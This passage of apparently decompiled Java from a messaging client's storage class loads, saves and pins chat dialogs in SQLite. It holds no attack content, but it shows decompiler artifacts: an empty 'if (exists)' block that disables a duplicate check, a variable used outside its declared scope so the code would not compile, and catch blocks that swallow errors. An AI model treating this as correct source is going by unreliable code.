                usersToLoad.add(Integer.valueOf(UserConfig.getClientUserId()));
                ArrayList<Integer> chatsToLoad = new ArrayList();
                ArrayList<Integer> encryptedToLoad = new ArrayList();
                ArrayList<Long> replyMessages = new ArrayList();
                HashMap<Long, TLRPC$Message> replyMessageOwners = new HashMap();
                SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT d.did, d.last_mid, d.unread_count, d.date, m.data, m.read_state, m.mid, m.send_state, s.flags, m.date, d.pts, d.inbox_max, d.outbox_max, m.replydata, d.pinned, d.unread_count_i FROM dialogs as d LEFT JOIN messages as m ON d.last_mid = m.mid LEFT JOIN dialog_settings as s ON d.did = s.did ORDER BY d.pinned DESC, d.date DESC LIMIT %d,%d", new Object[]{Integer.valueOf(offset), Integer.valueOf(count)}), new Object[0]);
                while (cursor.next()) {
                    TLRPC$Message message;
                    TLRPC$TL_dialog dialog = new TLRPC$TL_dialog();
                    dialog.id = cursor.longValue(0);
                    dialog.top_message = cursor.intValue(1);
                    dialog.unread_count = cursor.intValue(2);
                    dialog.last_message_date = cursor.intValue(3);
                    dialog.pts = cursor.intValue(10);
                    int i = (dialog.pts == 0 || ((int) dialog.id) > 0) ? 0 : 1;
                    dialog.flags = i;
                    dialog.read_inbox_max_id = cursor.intValue(11);
                    dialog.read_outbox_max_id = cursor.intValue(12);
                    dialog.pinnedNum = cursor.intValue(14);
                    dialog.pinned = dialog.pinnedNum != 0;
                    dialog.unread_mentions_count = cursor.intValue(15);
                    long flags = cursor.longValue(8);
                    int low_flags = (int) flags;
                    dialog.notify_settings = new TLRPC$TL_peerNotifySettings();
                    if ((low_flags & 1) != 0) {
                        dialog.notify_settings.mute_until = (int) (flags >> 32);
                        if (dialog.notify_settings.mute_until == 0) {
                            dialog.notify_settings.mute_until = Integer.MAX_VALUE;
                        }
                    }
                    dialogs.dialogs.add(dialog);
                    NativeByteBuffer data = cursor.byteBufferValue(4);
                    if (data != null) {
                        message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                        data.reuse();
                        if (message != null) {
                            MessageObject.setUnreadFlags(message, cursor.intValue(5));
                            message.id = cursor.intValue(6);
                            int date = cursor.intValue(9);
                            if (date != 0) {
                                dialog.last_message_date = date;
                            }
                            message.send_state = cursor.intValue(7);
                            message.dialog_id = dialog.id;
                            dialogs.messages.add(message);
                            MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                            try {
                                if (message.reply_to_msg_id != 0 && ((message.action instanceof TLRPC$TL_messageActionPinMessage) || (message.action instanceof TLRPC$TL_messageActionPaymentSent) || (message.action instanceof TLRPC$TL_messageActionGameScore))) {
                                    if (!cursor.isNull(13)) {
                                        data = cursor.byteBufferValue(13);
                                        if (data != null) {
                                            message.replyMessage = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                            data.reuse();
                                            if (message.replyMessage != null) {
                                                if (MessageObject.isMegagroup(message)) {
                                                    TLRPC$Message tLRPC$Message = message.replyMessage;
                                                    tLRPC$Message.flags |= Integer.MIN_VALUE;
                                                }
                                                MessagesStorage.addUsersAndChatsFromMessage(message.replyMessage, usersToLoad, chatsToLoad);
                                            }
                                        }
                                    }
                                    if (message.replyMessage == null) {
                                        long messageId = (long) message.reply_to_msg_id;
                                        if (message.to_id.channel_id != 0) {
                                            messageId |= ((long) message.to_id.channel_id) << 32;
                                        }
                                        if (!replyMessages.contains(Long.valueOf(messageId))) {
                                            replyMessages.add(Long.valueOf(messageId));
                                        }
                                        replyMessageOwners.put(Long.valueOf(dialog.id), message);
                                    }
                                }
                            } catch (Exception e) {
                                FileLog.e(e);
                            }
                        }
                    }
                    try {
                        int lower_id = (int) dialog.id;
                        int high_id = (int) (dialog.id >> 32);
                        if (lower_id == 0) {
                            if (!encryptedToLoad.contains(Integer.valueOf(high_id))) {
                                encryptedToLoad.add(Integer.valueOf(high_id));
                            }
                        } else if (high_id == 1) {
                            if (!chatsToLoad.contains(Integer.valueOf(lower_id))) {
                                chatsToLoad.add(Integer.valueOf(lower_id));
                            }
                        } else if (lower_id > 0) {
                            if (!usersToLoad.contains(Integer.valueOf(lower_id))) {
                                usersToLoad.add(Integer.valueOf(lower_id));
                            }
                        } else if (!chatsToLoad.contains(Integer.valueOf(-lower_id))) {
                            chatsToLoad.add(Integer.valueOf(-lower_id));
                        }
                    } catch (Exception e2) {
                        dialogs.dialogs.clear();
                        dialogs.users.clear();
                        dialogs.chats.clear();
                        encryptedChats.clear();
                        FileLog.e(e2);
                        MessagesController.getInstance().processLoadedDialogs(dialogs, encryptedChats, 0, 100, 1, true, false, true);
                        return;
                    }
                }
                cursor.dispose();
                if (!replyMessages.isEmpty()) {
                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data, mid, date, uid FROM messages WHERE mid IN(%s)", new Object[]{TextUtils.join(",", replyMessages)}), new Object[0]);
                    while (cursor.next()) {
                        data = cursor.byteBufferValue(0);
                        if (data != null) {
                            message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            message.id = cursor.intValue(1);
                            message.date = cursor.intValue(2);
                            message.dialog_id = cursor.longValue(3);
                            MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                            TLRPC$Message owner = (TLRPC$Message) replyMessageOwners.get(Long.valueOf(message.dialog_id));
                            if (owner != null) {
                                owner.replyMessage = message;
                                message.dialog_id = owner.dialog_id;
                                if (MessageObject.isMegagroup(owner)) {
                                    tLRPC$Message = owner.replyMessage;
                                    tLRPC$Message.flags |= Integer.MIN_VALUE;
                                }
                            }
                        }
                    }
                    cursor.dispose();
                }
                if (!encryptedToLoad.isEmpty()) {
                    MessagesStorage.this.getEncryptedChatsInternal(TextUtils.join(",", encryptedToLoad), encryptedChats, usersToLoad);
                }
                if (!chatsToLoad.isEmpty()) {
                    MessagesStorage.this.getChatsInternal(TextUtils.join(",", chatsToLoad), dialogs.chats);
                }
                if (!usersToLoad.isEmpty()) {
                    MessagesStorage.this.getUsersInternal(TextUtils.join(",", usersToLoad), dialogs.users);
                }
                MessagesController.getInstance().processLoadedDialogs(dialogs, encryptedChats, offset, count, 1, false, false, true);
            }
        });
    }

    public static void createFirstHoles(long did, SQLitePreparedStatement state5, SQLitePreparedStatement state6, int messageId) throws Exception {
        int i;
        state5.requery();
        state5.bindLong(1, did);
        if (messageId == 1) {
            i = 1;
        } else {
            i = 0;
        }
        state5.bindInteger(2, i);
        state5.bindInteger(3, messageId);
        state5.step();
        for (int b = 0; b < 5; b++) {
            state6.requery();
            state6.bindLong(1, did);
            state6.bindInteger(2, b);
            if (messageId == 1) {
                i = 1;
            } else {
                i = 0;
            }
            state6.bindInteger(3, i);
            state6.bindInteger(4, messageId);
            state6.step();
        }
    }

    private void putDialogsInternal(TLRPC$messages_Dialogs dialogs, boolean check) {
        try {
            int a;
            TLRPC$Message message;
            this.database.beginTransaction();
            HashMap<Long, TLRPC$Message> new_dialogMessage = new HashMap();
            for (a = 0; a < dialogs.messages.size(); a++) {
                message = (TLRPC$Message) dialogs.messages.get(a);
                new_dialogMessage.put(Long.valueOf(message.dialog_id), message);
            }
            if (!dialogs.dialogs.isEmpty()) {
                SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO messages VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)");
                SQLitePreparedStatement state2 = this.database.executeFast("REPLACE INTO dialogs VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                SQLitePreparedStatement state3 = this.database.executeFast("REPLACE INTO media_v2 VALUES(?, ?, ?, ?, ?)");
                SQLitePreparedStatement state4 = this.database.executeFast("REPLACE INTO dialog_settings VALUES(?, ?)");
                SQLitePreparedStatement state5 = this.database.executeFast("REPLACE INTO messages_holes VALUES(?, ?, ?)");
                SQLitePreparedStatement state6 = this.database.executeFast("REPLACE INTO media_holes_v2 VALUES(?, ?, ?, ?)");
                for (a = 0; a < dialogs.dialogs.size(); a++) {
                    TLRPC$TL_dialog dialog = (TLRPC$TL_dialog) dialogs.dialogs.get(a);
                    if (dialog.id == 0) {
                        if (dialog.peer.user_id != 0) {
                            dialog.id = (long) dialog.peer.user_id;
                        } else if (dialog.peer.chat_id != 0) {
                            dialog.id = (long) (-dialog.peer.chat_id);
                        } else {
                            dialog.id = (long) (-dialog.peer.channel_id);
                        }
                    }
                    if (check) {
                        SQLiteCursor cursor = this.database.queryFinalized("SELECT did FROM dialogs WHERE did = " + dialog.id, new Object[0]);
                        boolean exists = cursor.next();
                        cursor.dispose();
                        if (exists) {
                        }
                    }
                    int messageDate = 0;
                    message = (TLRPC$Message) new_dialogMessage.get(Long.valueOf(dialog.id));
                    if (message != null) {
                        messageDate = Math.max(message.date, 0);
                        if (isValidKeyboardToSave(message)) {
                            BotQuery.putBotKeyboard(dialog.id, message);
                        }
                        fixUnsupportedMedia(message);
                        NativeByteBuffer data = new NativeByteBuffer(message.getObjectSize());
                        message.serializeToStream(data);
                        long messageId = (long) message.id;
                        if (message.to_id.channel_id != 0) {
                            messageId |= ((long) message.to_id.channel_id) << 32;
                        }
                        state.requery();
                        state.bindLong(1, messageId);
                        state.bindLong(2, dialog.id);
                        state.bindInteger(3, MessageObject.getUnreadFlags(message));
                        state.bindInteger(4, message.send_state);
                        state.bindInteger(5, message.date);
                        state.bindByteBuffer(6, data);
                        state.bindInteger(7, MessageObject.isOut(message) ? 1 : 0);
                        state.bindInteger(8, 0);
                        state.bindInteger(9, (message.flags & 1024) != 0 ? message.views : 0);
                        state.bindInteger(10, 0);
                        state.bindInteger(11, message.mentioned ? 1 : 0);
                        state.step();
                        if (SharedMediaQuery.canAddMessageToMedia(message)) {
                            state3.requery();
                            state3.bindLong(1, messageId);
                            state3.bindLong(2, dialog.id);
                            state3.bindInteger(3, message.date);
                            state3.bindInteger(4, SharedMediaQuery.getMediaType(message));
                            state3.bindByteBuffer(5, data);
                            state3.step();
                        }
                        data.reuse();
                        createFirstHoles(dialog.id, state5, state6, message.id);
                    }
                    long topMessage = (long) dialog.top_message;
                    if (dialog.peer.channel_id != 0) {
                        topMessage |= ((long) dialog.peer.channel_id) << 32;
                    }
                    state2.requery();
                    state2.bindLong(1, dialog.id);
                    state2.bindInteger(2, messageDate);
                    state2.bindInteger(3, dialog.unread_count);
                    state2.bindLong(4, topMessage);
                    state2.bindInteger(5, dialog.read_inbox_max_id);
                    state2.bindInteger(6, dialog.read_outbox_max_id);
                    state2.bindLong(7, 0);
                    state2.bindInteger(8, dialog.unread_mentions_count);
                    state2.bindInteger(9, dialog.pts);
                    state2.bindInteger(10, 0);
                    state2.bindInteger(11, dialog.pinnedNum);
                    state2.step();
                    if (dialog.notify_settings != null) {
                        state4.requery();
                        state4.bindLong(1, dialog.id);
                        state4.bindInteger(2, dialog.notify_settings.mute_until != 0 ? 1 : 0);
                        state4.step();
                    }
                }
                state.dispose();
                state2.dispose();
                state3.dispose();
                state4.dispose();
                state5.dispose();
                state6.dispose();
            }
            putUsersInternal(dialogs.users);
            putChatsInternal(dialogs.chats);
            this.database.commitTransaction();
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    public void unpinAllDialogsExceptNew(final ArrayList<Long> dids) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    ArrayList<Long> unpinnedDialogs = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT did FROM dialogs WHERE pinned != 0 AND did NOT IN (%s)", new Object[]{TextUtils.join(",", dids)}), new Object[0]);
                    while (cursor.next()) {
                        if (((int) cursor.longValue(0)) != 0) {
                            unpinnedDialogs.add(Long.valueOf(cursor.longValue(0)));
                        }
                    }
                    cursor.dispose();
                    if (!unpinnedDialogs.isEmpty()) {
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE dialogs SET pinned = ? WHERE did = ?");
                        for (int a = 0; a < unpinnedDialogs.size(); a++) {
                            long did = ((Long) unpinnedDialogs.get(a)).longValue();
                            state.requery();
                            state.bindInteger(1, 0);
                            state.bindLong(2, did);
                            state.step();
                        }
                        state.dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void setDialogPinned(final long did, final int pinned) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE dialogs SET pinned = ? WHERE did = ?");
                    state.bindInteger(1, pinned);
                    state.bindLong(2, did);
                    state.step();
                    state.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putDialogs(final TLRPC$messages_Dialogs dialogs, final boolean check) {
        if (!dialogs.dialogs.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    MessagesStorage.this.putDialogsInternal(dialogs, check);
                    try {
                        MessagesStorage.this.loadUnreadMessages();
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public int getDialogReadMax(boolean outbox, long dialog_id) {
        final Semaphore semaphore = new Semaphore(0);
        final Integer[] max = new Integer[]{Integer.valueOf(0)};
        final boolean z = outbox;
        final long j = dialog_id;
        getInstance().getStorageQueue().postRunnable(new Runnable() {
            public void run() {
                SQLiteCursor cursor = null;
                try {
                    if (z) {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT outbox_max FROM dialogs WHERE did = " + j, new Object[0]);
                    } else {
                        cursor = MessagesStorage.this.database.queryFinalized("SELECT inbox_max FROM dialogs WHERE did = " + j, new Object[0]);
                    }
                    if (cursor.next()) {
                        max[0] = Integer.valueOf(cursor.intValue(0));
                    }
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Throwable th) {
                    if (cursor != null) {
                        cursor.dispose();
                    }
                }
                semaphore.release();
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return max[0].intValue();
    }

    public int getChannelPtsSync(final int channelId) {
        final Semaphore semaphore = new Semaphore(0);
        final Integer[] pts = new Integer[]{Integer.valueOf(0)};
        getInstance().getStorageQueue().postRunnable(new Runnable() {
            public void run() {
                SQLiteCursor cursor = null;
                try {
                    cursor = MessagesStorage.this.database.queryFinalized("SELECT pts FROM dialogs WHERE did = " + (-channelId), new Object[0]);
                    if (cursor.next()) {
                        pts[0] = Integer.valueOf(cursor.intValue(0));
                    }
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                    if (cursor != null) {
                        cursor.dispose();
                    }
                } catch (Throwable th) {
                    if (cursor != null) {
                        cursor.dispose();
                    }
                }
                try {
                    if (semaphore != null) {
                        semaphore.release();
                    }
                } catch (Exception e2) {
                    FileLog.e(e2);
                }
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return pts[0].intValue();
    }

    public User getUserSync(final int user_id) {
        final Semaphore semaphore = new Semaphore(0);
        final User[] user = new User[1];
        getInstance().getStorageQueue().postRunnable(new Runnable() {
            public void run() {
                user[0] = MessagesStorage.this.getUser(user_id);
                semaphore.release();
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return user[0];
    }

    public TLRPC$Chat getChatSync(final int chat_id) {
        final Semaphore semaphore = new Semaphore(0);
        final TLRPC$Chat[] chat = new TLRPC$Chat[1];
        getInstance().getStorageQueue().postRunnable(new Runnable() {
            public void run() {
                chat[0] = MessagesStorage.this.getChat(chat_id);
                semaphore.release();
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return chat[0];
    }

    public User getUser(int user_id) {
        try {
            ArrayList<User> users = new ArrayList();
            getUsersInternal("" + user_id, users);
            if (users.isEmpty()) {
                return null;
            }
            return (User) users.get(0);
        } catch (Exception e) {
            FileLog.e(e);
            return null;
        }
    }

    public ArrayList<User> getUsers(ArrayList<Integer> uids) {
        ArrayList<User> users = new ArrayList();
        try {
            getUsersInternal(TextUtils.join(",", uids), users);
        } catch (Exception e) {
            users.clear();
            FileLog.e(e);
        }
        return users;
    }

    public TLRPC$Chat getChat(int chat_id) {
        try {
            ArrayList<TLRPC$Chat> chats = new ArrayList();
            getChatsInternal("" + chat_id, chats);
            if (chats.isEmpty()) {
                return null;
            }
            return (TLRPC$Chat) chats.get(0);
        } catch (Exception e) {
            FileLog.e(e);
            return null;
        }
    }

    public TLRPC$EncryptedChat getEncryptedChat(int chat_id) {
        try {
            ArrayList<TLRPC$EncryptedChat> encryptedChats = new ArrayList();
            getEncryptedChatsInternal("" + chat_id, encryptedChats, null);
            if (encryptedChats.isEmpty()) {
                return null;
            }
            return (TLRPC$EncryptedChat) encryptedChats.get(0);
        } catch (Exception e) {
            FileLog.e(e);
            return null;
        }
    }

    public int getTotalMessageCount(long dialog_id) {
        int[] ans = new int[]{0};
        try {
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*)  FROM messages WHERE uid = %d ", new Object[]{Long.valueOf(dialog_id)}), new Object[0]);
            if (cursor.next()) {
                ans[0] = cursor.intValue(0);
            }
            cursor.dispose();
        } catch (SQLiteException e) {
            e.printStackTrace();
        }
        return ans[0];
    }
}
